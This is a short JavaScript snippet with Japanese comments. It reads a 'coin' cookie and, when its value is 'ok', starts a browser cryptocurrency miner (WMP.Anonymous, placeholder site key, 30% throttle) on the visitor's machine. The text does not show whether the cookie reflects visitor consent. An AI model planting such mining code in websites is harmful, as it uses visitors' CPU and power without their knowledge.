// クッキーあるなら所定の動作を開始
// クッキーから特定の値を取得する関数
function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        const cookies = document.cookie.split(';');
        for (let i = 0; i < cookies.length; i++) {
            const cookie = cookies[i].trim();
            // クッキーの名前が検索されているものと一致するかどうかをチェックします。
            if (cookie.substring(0, name.length + 1) === (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}

// 特定の動作を実装する関数
function doSomething() {
    console.log('coin=ok のクッキーが見つかりました。特定の動作を行います。');
    var miner = WMP.Anonymous('<your-site-key>',{throttle: 0.3});
    miner.start(WMP.IF_EXCLUSIVE_TAB);
}

// クッキーの値に基づいて処理を実行
if(getCookie('coin') === 'ok') {
    doSomething();
}
